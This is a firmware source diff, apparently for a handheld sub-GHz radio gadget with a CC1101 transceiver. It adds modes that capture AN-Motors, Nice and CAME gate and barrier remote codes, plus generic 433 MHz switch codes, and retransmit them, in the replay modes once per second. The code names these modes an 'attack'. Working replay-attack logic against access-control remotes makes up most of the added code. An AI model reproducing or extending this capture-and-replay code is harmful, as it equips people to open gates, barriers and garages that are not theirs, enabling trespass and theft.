@@ -42,6 +42,8 @@ void setup()
 
   communication.setRadioNRF24();
   communication.setSlaveMode();
+
+  Serial.printf("Current mode: %d\n", currentMode);
 }
 
 void setup1()
@@ -62,10 +64,15 @@ void loop()
       Serial.println("Initializing Idle mode...");
       communication.setRadioNRF24();
       communication.setSlaveMode();
+      ELECHOUSE_cc1101.goSleep();
+      mySwitch.disableReceive();
+      mySwitch.disableTransmit();
+      detachInterrupt(GD0_PIN_CC);
+      digitalWrite(GD0_PIN_CC, LOW);
+      stopRadioAttack();
       initializedIdle = true;
+      initialized = false;
     }
-
-    ELECHOUSE_cc1101.goSleep();
     break;
   }
   case HF_SPECTRUM:
@@ -92,22 +99,100 @@ void loop()
   }
   case HF_BARRIER_SCAN:
   {
+    static float radioFrequency = raFrequencies[1];
+
     if (!initialized)
     {
       Serial.println("Initializing HF Barrier Scan mode...");
       cc1101ReadyMode();
+      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
+      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
+      pinMode(GD0_PIN_CC, INPUT);
+      mySwitch.disableReceive();
+      mySwitch.disableTransmit();
+      ELECHOUSE_cc1101.SetRx(radioFrequency);
+      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
       initialized = true;
+    }
+
+    if (anMotorsCaptured || cameCaptured || niceCaptured)
+    {
+      anMotorsCaptured = false;
+      niceCaptured = false;
+      cameCaptured = false;
+
+      // Repeating the signal
+      pinMode(GD0_PIN_CC, OUTPUT);
+      ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+      if (barrierProtocol == 0)
+      {
+        sendANMotors(barrierCodeMain, barrierCodeAdd);
+      }
+      else if (barrierProtocol == 1)
+      {
+        sendNice(barrierCodeMain);
+      }
+      else if (barrierProtocol == 2)
+      {
+        sendCame(barrierCodeMain);
+      }
+
+      initialized = false;
     }
 
     break;
   }
   case HF_BARRIER_REPLAY:
   {
+    static float radioFrequency = raFrequencies[1];
+    static bool attackIsActive = false;
+    static uint32_t attackTimer = now;
+
     if (!initialized)
     {
       Serial.println("Initializing HF Barrier Replay mode...");
       cc1101ReadyMode();
+      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
+      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
+      pinMode(GD0_PIN_CC, INPUT);
+      mySwitch.disableReceive();
+      mySwitch.disableTransmit();
+      ELECHOUSE_cc1101.SetRx(radioFrequency);
+      attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
       initialized = true;
+    }
+
+    if (anMotorsCaptured || cameCaptured || niceCaptured)
+    {
+      anMotorsCaptured = false;
+      niceCaptured = false;
+      cameCaptured = false;
+
+      // Repeating the signal
+      pinMode(GD0_PIN_CC, OUTPUT);
+      detachInterrupt(GD0_PIN_CC);
+      ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+      attackIsActive = true;
+    }
+
+
+    if (attackIsActive && now - attackTimer >= 1000)
+    {
+      if (barrierProtocol == 0)
+      {
+        sendANMotors(barrierCodeMain, barrierCodeAdd);
+      }
+      else if (barrierProtocol == 1)
+      {
+        sendNice(barrierCodeMain);
+      }
+      else if (barrierProtocol == 2)
+      {
+        sendCame(barrierCodeMain);
+      }
+      attackTimer = now;
     }
 
     break;
@@ -182,22 +267,91 @@ void loop()
   }
   case HF_SCAN:
   {
+    static float radioFrequency = raFrequencies[1];
+
     if (!initialized)
     {
       Serial.println("Initializing HF Scan mode...");
+      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
+      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
       cc1101ReadyMode();
+      pinMode(GD0_PIN_CC, INPUT);
+      mySwitch.disableTransmit();
+      mySwitch.enableReceive(GD0_PIN_CC);
+      ELECHOUSE_cc1101.SetRx(radioFrequency);
+      mySwitch.resetAvailable();
       initialized = true;
+    }
+
+    if (mySwitch.available())
+    {
+      // Check if the signal is valid
+      if (mySwitch.getReceivedBitlength() < 10)
+      {
+        mySwitch.resetAvailable();
+        break;
+      }
+
+      mySwitch.resetAvailable();
+
+      // Reapiting the signal
+      mySwitch.disableReceive();
+      mySwitch.enableTransmit(GD0_PIN_CC);
+      pinMode(GD0_PIN_CC, OUTPUT);
+      ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
+      mySwitch.send(mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());
+      initialized = false;
     }
 
     break;
   }
   case HF_REPLAY:
   {
+    static float radioFrequency = raFrequencies[1];
+    static bool attackIsActive = false;
+    static uint32_t attackTimer = now;
+
     if (!initialized)
     {
       Serial.println("Initializing HF Replay mode...");
+      radioFrequency = getFrequencyFromPacket(recievedData, recievedDataLen);
+      Serial.printf("Setting frequency to: %.2f MHz\n", radioFrequency);
       cc1101ReadyMode();
+      pinMode(GD0_PIN_CC, INPUT);
+      mySwitch.disableTransmit();
+      mySwitch.enableReceive(GD0_PIN_CC);
+      ELECHOUSE_cc1101.SetRx(radioFrequency);
+      mySwitch.resetAvailable();
       initialized = true;
+    }
+
+    if (mySwitch.available())
+    {
+      // Check if the signal is valid
+      if (mySwitch.getReceivedBitlength() < 10)
+      {
+        mySwitch.resetAvailable();
+        break;
+      }
+
+      mySwitch.resetAvailable();
+
+      // Reapiting the signal
+      mySwitch.disableReceive();
+      mySwitch.enableTransmit(GD0_PIN_CC);
+      pinMode(GD0_PIN_CC, OUTPUT);
+      ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+      mySwitch.setProtocol(mySwitch.getReceivedProtocol());
+      attackIsActive = true;
+    }
+
+    if (attackIsActive && now - attackTimer >= 1000)
+    {
+      mySwitch.send(capturedCode, capturedLength);
+      attackTimer = now;
     }
 
     break;
@@ -317,9 +471,6 @@ void loop()
 // Loop for communication tasks
 void loop1()
 {
-  uint8_t data[32];
-  uint8_t len = 0;
-
   if (!succsessfulConnection)
   {
     if (communication.checkConnection(1000))
@@ -331,12 +482,16 @@ void loop1()
     {
       Serial.println("Connection failed");
     }
+
+    Serial.printf("Current mode: %d\n", currentMode);
   }
 
-  if (succsessfulConnection && communication.getCurrentMode() == Slave && communication.receivePacket(data, &len))
+  if (succsessfulConnection && communication.getCurrentMode() == Slave && communication.receivePacket(recievedData, &recievedDataLen))
   {
-    currentMode = getModeFromPacket(data, len);
-    Serial.printf("Received packet with mode: %d, length: %d\n", currentMode, len);
+    currentMode = getModeFromPacket(recievedData, recievedDataLen);
+    Serial.printf("Current mode: %d\n", currentMode);
+    initializedIdle = false;
+    Serial.printf("Received packet with mode: %d, length: %d\n", currentMode, recievedDataLen);
     switch (currentMode)
     {
     case UHF_SPECTRUM:
@@ -352,6 +507,4 @@ void loop1()
       break;
     }
   }
-
-  Serial.printf("Current mode: %d\n", currentMode);
 }
